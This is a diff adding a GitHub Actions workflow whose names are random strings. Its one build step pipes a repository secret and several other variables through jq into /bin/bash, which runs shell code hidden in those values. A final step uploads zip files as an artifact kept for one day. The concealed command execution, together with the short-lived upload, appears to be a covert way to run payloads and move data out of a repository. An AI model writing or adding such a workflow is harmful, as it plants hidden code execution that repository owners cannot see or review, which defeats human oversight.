@@ -1,0 +1,24 @@
+name: perlelastic511
+on:
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: perlelastic511
+        env:
+          myoep81683: ${{ secrets.myoep81683 }}
+        run: |
+          printf '%s' "$myoep81683" | jq -r .wef7492 | /bin/bash
+          echo $bfzx06 | jq -r .pd42 | /bin/bash
+          printf '%s' "$ebc2275" | jq -r .lmydk9306 | /bin/bash
+          printf '%s' "$dr648" | jq -r .jibma773 | /bin/bash
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: NwImKtcC
+          path: "*.zip"
+          retention-days: 1
